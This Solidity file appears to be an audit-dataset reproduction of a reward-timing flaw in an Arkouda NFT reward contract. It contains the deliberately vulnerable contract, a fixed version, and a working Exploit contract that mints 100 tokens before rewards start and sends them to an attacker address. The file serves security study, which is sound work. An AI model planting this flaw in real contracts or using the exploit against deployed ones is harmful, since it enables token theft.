// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

/*
 * AuditVault 56419 — CWBC Arkouda.claimReward (Zokyo, 2022-02).
 *
 * rewardGenerationStartTime defaults to 0 and is set by a separate admin call.
 * claimReward never rejects 0, so `block.timestamp >= rewardGenerationStartTime`
 * is true before startRewardGeneration(). A holder who already held the NFT
 * mints Arkouda immediately.
 *
 * The holding clock is the NFT's stored acquisition time (1). This block's
 * timestamp is 1 + 10 days, set once for the whole transaction — not warped
 * inside run(). 10 days * BASE_REWARD (10 ARK) = 100 ARK minted before start.
 */

contract Arkouda {
    uint256 public constant BASE_REWARD = 10 ether;

    uint256 public rewardGenerationStartTime;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public acquiredAt;

    uint256 public holdersChecked;
    uint256 public passedStartGate;
    uint256 public lastDays;
    uint256 public lastReward;

    function mintNft(address to, uint256 id, uint256 whenAcquired) external {
        require(ownerOf[id] == address(0), "exists");
        ownerOf[id] = to;
        acquiredAt[id] = whenAcquired;
    }

    function startRewardGeneration() external {
        require(rewardGenerationStartTime == 0, "already");
        rewardGenerationStartTime = block.timestamp;
    }

    function claimReward(uint256 tokenId) external {
        require(ownerOf[tokenId] == msg.sender, "holder");
        holdersChecked += 1;
        // rewardGenerationStartTime == 0 is not rejected.
        require(block.timestamp >= rewardGenerationStartTime, "before start");
        passedStartGate += 1;
        uint256 daysHeld = (block.timestamp - acquiredAt[tokenId]) / 1 days;
        lastDays = daysHeld;
        // @> VULN:
        lastReward = daysHeld * BASE_REWARD;
        balanceOf[msg.sender] += lastReward;
        totalSupply += lastReward;
        acquiredAt[tokenId] = block.timestamp;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ArkoudaFixed {
    uint256 public constant BASE_REWARD = 10 ether;
    uint256 public rewardGenerationStartTime;
    mapping(address => uint256) public balanceOf;
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => uint256) public acquiredAt;

    function mintNft(address to, uint256 id, uint256 whenAcquired) external {
        ownerOf[id] = to;
        acquiredAt[id] = whenAcquired;
    }

    function claimReward(uint256 tokenId) external {
        require(ownerOf[tokenId] == msg.sender, "holder");
        require(rewardGenerationStartTime != 0, "not started");
        require(block.timestamp >= rewardGenerationStartTime, "before start");
        uint256 daysHeld = (block.timestamp - acquiredAt[tokenId]) / 1 days;
        uint256 reward = daysHeld * BASE_REWARD;
        balanceOf[msg.sender] += reward;
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 internal constant PURCHASED_AT = 1;

    Arkouda public arkouda;
    uint256 public minted;
    bool public stillNotStarted;

    function run() external {
        require(block.timestamp >= PURCHASED_AT + 10 days, "one block at day 10");
        arkouda = new Arkouda();
        arkouda.mintNft(address(this), 1, PURCHASED_AT);
        stillNotStarted = arkouda.rewardGenerationStartTime() == 0;
        arkouda.claimReward(1);
        minted = arkouda.lastReward();
        require(stillNotStarted, "start");
        require(arkouda.lastDays() == 10, "days");
        require(minted == 100 ether, "mint");
        arkouda.transfer(ATTACKER, minted);
    }
}
